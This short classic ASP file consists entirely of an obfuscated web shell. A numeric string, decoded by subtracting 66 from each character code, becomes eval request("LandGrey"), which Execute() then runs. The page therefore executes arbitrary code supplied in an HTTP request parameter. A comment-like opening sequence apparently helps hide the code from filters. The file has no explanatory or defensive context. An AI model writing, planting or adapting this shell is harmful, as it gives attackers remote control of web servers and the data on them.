<%<!--"-->
eXecUTe(fun("%167%184%163%174%98%180%167%179%183%167%181%182%106%100%142%163%176%166%137%180%167%187%100%107"))

Function fun(Str):
	Str = Split(Str,"%")
	For x=1 To Ubound(Str)
		fun=fun&Chr(Str(x)-66)
	Next
End Function
%>
